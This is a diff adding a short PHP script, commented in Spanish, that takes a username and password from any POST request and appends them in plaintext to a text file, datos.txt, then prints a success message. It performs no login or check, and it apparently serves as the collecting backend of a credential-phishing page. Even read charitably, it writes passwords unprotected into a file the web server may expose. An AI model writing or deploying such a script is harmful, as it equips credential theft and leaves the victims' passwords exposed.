@@ -1,0 +1,18 @@
+<?php
+// Verifica si hay datos enviados por POST
+if ($_SERVER["REQUEST_METHOD"] == "POST") {
+    // Recoge los datos de usuario y contraseña
+    $usuario = isset($_POST['usuario']) ? $_POST['usuario'] : '';
+    $contrasena = isset($_POST['contrasena']) ? $_POST['contrasena'] : '';
+
+    // Prepara la cadena a escribir en el archivo
+    $data = "Usuario: " . $usuario . ", Contraseña: " . $contrasena . "\n";
+
+    // Escribe los datos en un archivo txt
+    file_put_contents('datos.txt', $data, FILE_APPEND);
+
+    echo "Datos guardados con éxito.";
+} else {
+    echo "No se han recibido datos por POST.";
+}
+?>
